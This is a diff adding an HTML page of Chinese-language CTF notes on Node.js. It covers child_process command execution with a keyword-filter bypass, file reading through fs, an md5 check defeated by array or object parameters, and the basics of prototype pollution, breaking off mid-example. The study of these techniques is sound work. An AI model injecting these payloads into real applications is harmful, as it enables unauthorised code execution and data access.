@@ -1,0 +1,862 @@
+<!DOCTYPE html>
+
+
+
+
+
+    
+
+    
+
+    
+
+    
+
+<html lang="zh-cn"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8" />
+    <title>ctf nodejs test | 遥乡书屋</title>
+    <meta name="robots" content="noindex">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="nodejs test">
+    <meta name="keywords" content="Documentation, Hugo, Hugo Theme, Bootstrap" />
+    <meta name="author" content="Colin Wilson - Lotus Labs" />
+    <meta name="email" content="support@aigis.uk" />
+    <meta name="website" content="https://lotusdocs.dev" />
+    <meta name="Version" content="v0.1.0" />
+    
+    <link rel="icon" href="http://localhost:1313/favicon.ico" sizes="any">
+<link rel="icon" type="image/svg+xml" href="http://localhost:1313/favicon.svg">
+<link rel="apple-touch-icon" sizes="180x180" href="http://localhost:1313/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
+<link rel="manifest" crossorigin="use-credentials" href="http://localhost:1313/site.webmanifest">
+<meta property="og:title" content="ctf nodejs test" />
+<meta property="og:description" content="nodejs test" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://localhost:1313/docs/example-page/" /><meta property="og:image" content="http://localhost:1313/opengraph/card-base-2_hu_856f12270ca5eba7.png"/><meta property="article:section" content="docs" />
+<meta property="article:published_time" content="2025-05-29T10:43:44+08:00" />
+<meta property="article:modified_time" content="2025-05-29T10:43:44+08:00" /><meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="http://localhost:1313/opengraph/card-base-2_hu_856f12270ca5eba7.png"/>
+<meta name="twitter:title" content="ctf nodejs test"/>
+<meta name="twitter:description" content="nodejs test"/>
+
+    
+        <link rel="alternate" type="application/atom+xml" title="Atom feed for 遥乡书屋" href="/index.xml" />
+    
+    
+    
+            
+                <script type="text/javascript" src="http://localhost:1313/docs/js/flexsearch.bundle.js"></script>
+            
+        
+    
+    
+
+    <link rel="stylesheet" href="/docs/scss/style.css" crossorigin="anonymous">
+    
+    
+    </head>
+<body>
+        <div class="content">
+            <div class="page-wrapper toggled">
+<nav id="sidebar" class="sidebar-wrapper">
+    <div class="sidebar-brand">
+        <a href='/' aria-label="HomePage" alt="HomePage">
+            
+                <?xml version="1.0" encoding="UTF-8"?><svg id="Layer_1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 250 250"><path d="m143,39.5c-18,0-18,18-18,18,0,0,0-18-18-18H22c-2.76,0-5,2.24-5,5v143c0,2.76,2.24,5,5,5h76c7.2,0,8.64,11.52,8.93,16.13.07,1.05.95,1.87,2,1.87h32.14c1.06,0,1.94-.82,2-1.87.29-4.61,1.73-16.13,8.93-16.13h76c2.76,0,5-2.24,5-5V44.5c0-2.76-2.24-5-5-5h-85Zm63,123.5c0,1.38-1.12,2.5-2.5,2.5h-60.5c-18,0-18,18-18,18,0,0,0-18-18-18h-60.5c-1.38,0-2.5-1.12-2.5-2.5v-94c0-1.38,1.12-2.5,2.5-2.5h51.5c7.2,0,8.64,11.52,8.93,16.13.07,1.05.95,1.87,2,1.87h32.14c1.06,0,1.94-.82,2-1.87.29-4.61,1.73-16.13,8.93-16.13h51.5c1.38,0,2.5,1.12,2.5,2.5v94Z" style="fill:#06f;"/></svg>
+            
+        </a>
+    </div>
+    <div class="sidebar-content" style="height: calc(100% - 131px);">
+        <ul class="sidebar-menu">
+            
+                
+                
+                    
+                        
+                        <li class="current">
+                            <a class="sidebar-root-link" href="http://localhost:1313/docs/example-page/">
+                                
+                                ctf nodejs test
+                            </a>
+                        </li>
+                    
+                
+            
+        </ul>
+        
+    </div>
+    
+        <ul class="sidebar-footer list-unstyled mb-0">
+            
+        </ul>
+    
+</nav>
+
+                    <main class="page-content bg-transparent">
+                        
+<div id="top-header" class="top-header d-print-none">
+    <div class="header-bar d-flex justify-content-between">
+        <div class="d-flex align-items-center">
+            <a href='/' class="logo-icon me-3" aria-label="HomePage" alt="HomePage">
+                <div class="small">
+                    
+                            <?xml version="1.0" encoding="UTF-8"?><svg id="Layer_1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 250 250"><path d="m143,39.5c-18,0-18,18-18,18,0,0,0-18-18-18H22c-2.76,0-5,2.24-5,5v143c0,2.76,2.24,5,5,5h76c7.2,0,8.64,11.52,8.93,16.13.07,1.05.95,1.87,2,1.87h32.14c1.06,0,1.94-.82,2-1.87.29-4.61,1.73-16.13,8.93-16.13h76c2.76,0,5-2.24,5-5V44.5c0-2.76-2.24-5-5-5h-85Zm63,123.5c0,1.38-1.12,2.5-2.5,2.5h-60.5c-18,0-18,18-18,18,0,0,0-18-18-18h-60.5c-1.38,0-2.5-1.12-2.5-2.5v-94c0-1.38,1.12-2.5,2.5-2.5h51.5c7.2,0,8.64,11.52,8.93,16.13.07,1.05.95,1.87,2,1.87h32.14c1.06,0,1.94-.82,2-1.87.29-4.61,1.73-16.13,8.93-16.13h51.5c1.38,0,2.5,1.12,2.5,2.5v94Z" style="fill:#06f;"/></svg>
+                    
+                </div>
+                <div class="big">
+                    
+                            <?xml version="1.0" encoding="UTF-8"?><svg id="Layer_1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 250 250"><path d="m143,39.5c-18,0-18,18-18,18,0,0,0-18-18-18H22c-2.76,0-5,2.24-5,5v143c0,2.76,2.24,5,5,5h76c7.2,0,8.64,11.52,8.93,16.13.07,1.05.95,1.87,2,1.87h32.14c1.06,0,1.94-.82,2-1.87.29-4.61,1.73-16.13,8.93-16.13h76c2.76,0,5-2.24,5-5V44.5c0-2.76-2.24-5-5-5h-85Zm63,123.5c0,1.38-1.12,2.5-2.5,2.5h-60.5c-18,0-18,18-18,18,0,0,0-18-18-18h-60.5c-1.38,0-2.5-1.12-2.5-2.5v-94c0-1.38,1.12-2.5,2.5-2.5h51.5c7.2,0,8.64,11.52,8.93,16.13.07,1.05.95,1.87,2,1.87h32.14c1.06,0,1.94-.82,2-1.87.29-4.61,1.73-16.13,8.93-16.13h51.5c1.38,0,2.5,1.12,2.5,2.5v94Z" style="fill:#06f;"/></svg>
+                    
+                </div>
+            </a>
+            <button id="close-sidebar" class="btn btn-icon btn-soft">
+                <span class="material-icons size-20 menu-icon align-middle">menu</span>
+            </button>
+            
+            
+                    
+                    <button id="flexsearch-button" class="ms-3 btn btn-soft" data-bs-toggle="collapse" data-bs-target="#FlexSearchCollapse" aria-expanded="false" aria-controls="FlexSearchCollapse">
+                        <span class="material-icons size-20 menu-icon align-middle">search</span>
+                        <span class="flexsearch-button-placeholder ms-1 me-2 d-none d-sm-block">Search</span>
+                        <div class="d-none d-sm-block">
+                            <span class="flexsearch-button-keys">
+                                <kbd class="flexsearch-button-cmd-key">
+                                    <svg width="44" height="15"><path d="M2.118,11.5A1.519,1.519,0,0,1,1,11.042,1.583,1.583,0,0,1,1,8.815a1.519,1.519,0,0,1,1.113-.458h.715V6.643H2.118A1.519,1.519,0,0,1,1,6.185,1.519,1.519,0,0,1,.547,5.071,1.519,1.519,0,0,1,1,3.958,1.519,1.519,0,0,1,2.118,3.5a1.519,1.519,0,0,1,1.114.458A1.519,1.519,0,0,1,3.69,5.071v.715H5.4V5.071A1.564,1.564,0,0,1,6.976,3.5,1.564,1.564,0,0,1,8.547,5.071,1.564,1.564,0,0,1,6.976,6.643H6.261V8.357h.715a1.575,1.575,0,0,1,1.113,2.685,1.583,1.583,0,0,1-2.227,0A1.519,1.519,0,0,1,5.4,9.929V9.214H3.69v.715a1.519,1.519,0,0,1-.458,1.113A1.519,1.519,0,0,1,2.118,11.5Zm0-.857a.714.714,0,0,0,.715-.714V9.214H2.118a.715.715,0,1,0,0,1.429Zm4.858,0a.715.715,0,1,0,0-1.429H6.261v.715a.714.714,0,0,0,.715.714ZM3.69,8.357H5.4V6.643H3.69ZM2.118,5.786h.715V5.071a.714.714,0,0,0-.715-.714.715.715,0,0,0-.5,1.22A.686.686,0,0,0,2.118,5.786Zm4.143,0h.715a.715.715,0,0,0,.5-1.22.715.715,0,0,0-1.22.5Z" fill="currentColor"></path><path d="M12.4,11.475H11.344l3.879-7.95h1.056Z" fill="currentColor"></path><path d="M25.073,5.384l-.864.576a2.121,2.121,0,0,0-1.786-.923,2.207,2.207,0,0,0-2.266,2.326,2.206,2.206,0,0,0,2.266,2.325,2.1,2.1,0,0,0,1.782-.918l.84.617a3.108,3.108,0,0,1-2.622,1.293,3.217,3.217,0,0,1-3.349-3.317,3.217,3.217,0,0,1,3.349-3.317A3.046,3.046,0,0,1,25.073,5.384Z" fill="currentColor"></path><path d="M30.993,5.142h-2.07v5.419H27.891V5.142h-2.07V4.164h5.172Z" fill="currentColor"></path><path d="M34.67,4.164c1.471,0,2.266.658,2.266,1.851,0,1.087-.832,1.809-2.134,1.855l2.107,2.691h-1.28L33.591,7.87H33.07v2.691H32.038v-6.4Zm-1.6.969v1.8h1.572c.832,0,1.22-.3,1.22-.918s-.411-.882-1.22-.882Z" fill="currentColor"></path><path d="M42.883,10.561H38.31v-6.4h1.033V9.583h3.54Z" fill="currentColor"></path></svg>
+                                </kbd>
+                                <kbd class="flexsearch-button-key">
+                                    <svg width="15" height="15"><path d="M5.926,12.279H4.41L9.073,2.721H10.59Z" fill="currentColor"/></svg>
+                                </kbd>
+                            </span>
+                        </div>
+                    </button>
+                
+            </div>
+
+        <div class="d-flex align-items-center">
+            <ul class="list-unstyled mb-0">
+                
+            </ul>
+            
+        </div>
+    </div>
+    
+    
+            <div class="collapse" id="FlexSearchCollapse">
+                <div class="flexsearch-container">
+                    <div class="flexsearch-keymap">
+                        <li>
+                            <kbd class="flexsearch-button-cmd-key"><svg width="15" height="15" aria-label="Arrow down" role="img"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M7.5 3.5v8M10.5 8.5l-3 3-3-3"></path></g></svg></kbd>
+                            <kbd class="flexsearch-button-cmd-key"><svg width="15" height="15" aria-label="Arrow up" role="img"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M7.5 11.5v-8M10.5 6.5l-3-3-3 3"></path></g></svg></kbd>
+                            <span class="flexsearch-key-label">to navigate</span>
+                        </li>
+                        <li>
+                            <kbd class="flexsearch-button-cmd-key"><svg width="15" height="15" aria-label="Enter key" role="img"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M12 3.53088v3c0 1-1 2-2 2H4M7 11.53088l-3-3 3-3"></path></g></svg></kbd>
+                            <span class="flexsearch-key-label">to select</span>
+                        </li>
+                        <li>
+                            <kbd class="flexsearch-button-cmd-key"><svg width="15" height="15" aria-label="Escape key" role="img"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M13.6167 8.936c-.1065.3583-.6883.962-1.4875.962-.7993 0-1.653-.9165-1.653-2.1258v-.5678c0-1.2548.7896-2.1016 1.653-2.1016.8634 0 1.3601.4778 1.4875 1.0724M9 6c-.1352-.4735-.7506-.9219-1.46-.8972-.7092.0246-1.344.57-1.344 1.2166s.4198.8812 1.3445.9805C8.465 7.3992 8.968 7.9337 9 8.5c.032.5663-.454 1.398-1.4595 1.398C6.6593 9.898 6 9 5.963 8.4851m-1.4748.5368c-.2635.5941-.8099.876-1.5443.876s-1.7073-.6248-1.7073-2.204v-.4603c0-1.0416.721-2.131 1.7073-2.131.9864 0 1.6425 1.031 1.5443 2.2492h-2.956"></path></g></svg></kbd>
+                            <span class="flexsearch-key-label">to close</span>
+                        </li>
+                    </div>
+                    <form class="flexsearch position-relative flex-grow-1 ms-2 me-2">
+                        <div class="d-flex flex-row">
+                            <input id="flexsearch" class="form-control" type="search" placeholder="Search" aria-label="Search" autocomplete="off">
+                            <button id="hideFlexsearch" type="button" class="ms-2 btn btn-soft">
+                                cancel
+                            </button>
+                        </div>
+                        <div id="suggestions" class="shadow rounded-1 d-none"></div>
+                    </form>
+                </div>
+            </div>
+        
+    
+    
+</div>
+
+
+                            <div class="container-fluid">
+                                <div class="layout-spacing">
+                                    
+                                        <div class="d-md-flex justify-content-between align-items-center"><nav aria-label="breadcrumb" class="d-inline-block pb-2 mt-1 mt-sm-0">
+    <ul id="breadcrumbs" class="breadcrumb bg-transparent mb-0" itemscope itemtype="https://schema.org/BreadcrumbList">
+        
+            
+                <li class="breadcrumb-item text-capitalize active" aria-current="page" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+                    <a itemprop="item" href="/docs/">
+                        <i class="material-icons size-20 align-text-bottom" itemprop="name">Home</i>
+                    </a>
+                    <meta itemprop="position" content='1' />
+                </li>
+            
+        
+            <li class="breadcrumb-item text-capitalize active" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+                <span itemprop="name">ctf nodejs test</span>
+                <meta itemprop="position" content='2' />
+            </li>
+        
+    </ul>
+</nav></div>
+                                    
+                                    <div class="row flex-xl-nowrap">
+                                        
+                                        <div class="docs-toc col-xl-3    d-xl-block"><toc>
+    <div class="fw-bold text-uppercase mb-2">On this page</div>
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#原理">原理</a></li>
+    <li><a href="#使用场景">使用场景</a></li>
+    <li><a href="#例题">例题：</a>
+      <ul>
+        <li><a href="#1">1</a></li>
+        <li><a href="#2">2</a></li>
+        <li><a href="#3">3</a></li>
+        <li><a href="#4">4</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+    </toc></div>
+                                        
+                                        
+                                        <div class="docs-toc-mobile    d-print-none d-xl-none">
+                                            <button id="toc-dropdown-btn" class="btn-secondary dropdown-toggle" type="button" data-bs-toggle="dropdown" data-bs-offset="0,0" aria-expanded="false">
+                                                Table of Contents
+                                            </button>
+<nav id="toc-mobile">
+  <ul class="dropdown-menu">
+    <li><a href="#原理">原理</a></li>
+    <li><a href="#使用场景">使用场景</a></li>
+    <li><a href="#例题">例题：</a>
+      <ul>
+        <li><a href="#1">1</a></li>
+        <li><a href="#2">2</a></li>
+        <li><a href="#3">3</a></li>
+        <li><a href="#4">4</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+                                        <div class="docs-content col-12 col-xl-9 mt-0">
+                                            <div class="mb-0 d-flex">
+                                                
+                                                <h1 class="content-title mb-0">
+                                                    ctf nodejs test
+                                                    
+                                                        <span class="badge bg-default fs-6 mb-1 align-middle">DRAFT</span>
+                                                    
+                                                </h1>
+                                            </div>
+                                            
+                                            <div id="content" class="main-content" >
+                                                
+    
+    <div data-prismjs-copy="" data-prismjs-copy-success="" data-prismjs-copy-error="">
+        <h1 id="命令执行">命令执行 <a href="#%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h1>
+
+    
+    <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;child_process&#39;</span>).<span style="color:#a6e22e">exec</span>(<span style="color:#e6db74">&#39;ls&#39;</span>); <span style="color:#75715e">//返回值是child_process，不能转字符串
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;child_process&#39;</span>).<span style="color:#a6e22e">execSync</span>(<span style="color:#e6db74">&#39;ls&#39;</span>).<span style="color:#a6e22e">toString</span>(); <span style="color:#75715e">//返回值是字符串
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;child_process&#39;</span>).<span style="color:#a6e22e">spawnSync</span>(<span style="color:#e6db74">&#39;ls&#39;</span>).<span style="color:#a6e22e">stdout</span>.<span style="color:#a6e22e">toString</span>();<span style="color:#75715e">// 返回object，toString转成字符串
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//绕过简单的限制
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;child_process&#39;</span>)[<span style="color:#e6db74">&#39;exe&#39;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#39;cSync&#39;</span>](<span style="color:#e6db74">&#39;ls&#39;</span>).<span style="color:#a6e22e">toString</span>()</span></span></code></pre></div>
+<p>不用<code>child_process</code>读取文件</p>
+
+
+    
+    <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">__filename</span> <span style="color:#75715e">//获取当前文件的绝对路径
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">__dirname</span> <span style="color:#75715e">//获取当前文件解析过后的文件夹的绝对路径
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;fs&#39;</span>).<span style="color:#a6e22e">readFileSync</span>(<span style="color:#a6e22e">__filename</span>,<span style="color:#e6db74">&#39;utf-8&#39;</span>); <span style="color:#75715e">//读取当前文件
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;fs&#39;</span>).<span style="color:#a6e22e">readdirSync</span>(<span style="color:#e6db74">&#39;.&#39;</span>) <span style="color:#75715e">//读取当前目录下所有文件
+</span></span></span></code></pre></div>
+<h1 id="md5">md5 <a href="#md5" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h1>
+
+    
+    <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">a</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">b</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">a</span>.<span style="color:#a6e22e">length</span><span style="color:#f92672">===</span><span style="color:#a6e22e">b</span>.<span style="color:#a6e22e">length</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">a</span><span style="color:#f92672">!==</span><span style="color:#a6e22e">b</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">md5</span>(<span style="color:#a6e22e">a</span><span style="color:#f92672">+</span><span style="color:#a6e22e">flag</span>)<span style="color:#f92672">===</span><span style="color:#a6e22e">md5</span>(<span style="color:#a6e22e">b</span><span style="color:#f92672">+</span><span style="color:#a6e22e">flag</span>))</span></span></code></pre></div>
+<blockquote>
+<p>传入a[]=1&amp;b[]=2
+得到的是[&lsquo;1&rsquo;]和[&lsquo;2&rsquo;]
+而nodejs中数组和字符串的拼接如下：</p></blockquote>
+
+
+    
+    <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#ae81ff">5</span><span style="color:#f92672">+</span>[<span style="color:#ae81ff">6</span>,<span style="color:#ae81ff">6</span>]); <span style="color:#75715e">//56,6
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;5&#34;</span><span style="color:#f92672">+</span><span style="color:#ae81ff">6</span>); <span style="color:#75715e">//56
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;5&#34;</span><span style="color:#f92672">+</span>[<span style="color:#ae81ff">6</span>,<span style="color:#ae81ff">6</span>]); <span style="color:#75715e">//56,6
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;5&#34;</span><span style="color:#f92672">+</span>[<span style="color:#e6db74">&#34;6&#34;</span>,<span style="color:#e6db74">&#34;6&#34;</span>]); <span style="color:#75715e">//56,6
+</span></span></span></code></pre></div>
+<blockquote>
+<p>则[&lsquo;a&rsquo;]+flag== &lsquo;a&rsquo;+flag</p></blockquote>
+<p>如果传入的是非数字索引，比如<code>[x]=1</code>，那么就会变为js的对象<code>{x:'1'}</code></p>
+
+
+    
+    <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">a</span><span style="color:#f92672">=</span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">x</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#39;1&#39;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">a</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;flag{123}&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#75715e">//返回的是： [object Object]flag{123}
+</span></span></span></code></pre></div>
+<blockquote>
+<p>所以传入a[x]=1&amp;b[x]=1也能绕过，此时<code>a!==b</code>比较的是内存地址，而不是键值。</p></blockquote>
+<h1 id="原型链污染">原型链污染 <a href="#%e5%8e%9f%e5%9e%8b%e9%93%be%e6%b1%a1%e6%9f%93" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h1>
+
+    
+    <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#75715e">//定义一个类
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">Foo</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">bar</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Foo</span>()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">//类内的方法
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">Foo</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">bar</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">show</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>() {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">bar</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">bar</span><span style="color:#f92672">=</span><span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">bar</span><span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>(<span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Foo</span>()).<span style="color:#a6e22e">show</span>() <span style="color:#75715e">//输出1
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//但是每次新建一个foo对象，this.show就会执行一次，show方法是绑定在对象上的，而不是绑定在类上
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//使用原型prototype创建类时，就会只创建一次show方法。
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">Foo</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">bar</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Foo</span>.<span style="color:#a6e22e">prototype</span>.<span style="color:#a6e22e">show</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">show</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">bar</span>)
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">foo</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Foo</span>()
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">foo</span>.<span style="color:#a6e22e">show</span>() <span style="color:#75715e">//输出1
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//原型prototype是类Foo的一个属性，所有实例化的对象，都有这个熟悉的内容。
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//foo对象天生就有show方法
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//通过proto属性可以访问类的原型，即：
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">foo</span>.<span style="color:#a6e22e">__proto__</span><span style="color:#f92672">==</span><span style="color:#a6e22e">Foo</span>.<span style="color:#a6e22e">prototype</span></span></span></code></pre></div>
+<blockquote>
+<p>总结：
+<code>prototype</code>是一个类的属性，所有类对象实例化时都会有<code>prototype</code>中的属性和方法</p></blockquote>
+<h1 id="js中的继承">js中的继承 <a href="#js%e4%b8%ad%e7%9a%84%e7%bb%a7%e6%89%bf" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h1><p>js中的继承使用的便是<code>prototype</code></p>
+
+
+    
+    <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">Father</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">first_name</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Donald&#39;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">last_name</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Trump&#39;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">Son</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">first_name</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Melania&#39;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Son</span>.<span style="color:#a6e22e">prototype</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Father</span>()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">son</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Son</span>()
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">`Name: </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">son</span>.<span style="color:#a6e22e">first_name</span><span style="color:#e6db74">}</span><span style="color:#e6db74"> </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">son</span>.<span style="color:#a6e22e">last_name</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>)
+</span></span><span style="display:flex;"><span><span style="color:#75715e">//输出：Name: Melania Trump
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//此过程为：在son中找last_name，如果找不到就在son.__proto__找，如果还找不到，就在son.__proto__.__proto__里找，依次寻找直到null结束，如Object.prototype的__proto__就是null
+</span></span></span></code></pre></div>
+<h1 id="原型链污染-1">原型链污染 <a href="#%e5%8e%9f%e5%9e%8b%e9%93%be%e6%b1%a1%e6%9f%93-1" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h1><h2 id="原理">原理 <a href="#%e5%8e%9f%e7%90%86" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h2><p>可以访问原型，也可以修改原型的值</p>
+
+
+    
+    <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">foo</span> <span style="color:#f92672">=</span> {<span style="color:#a6e22e">bar</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>}
+</span></span><span style="display:flex;"><span>
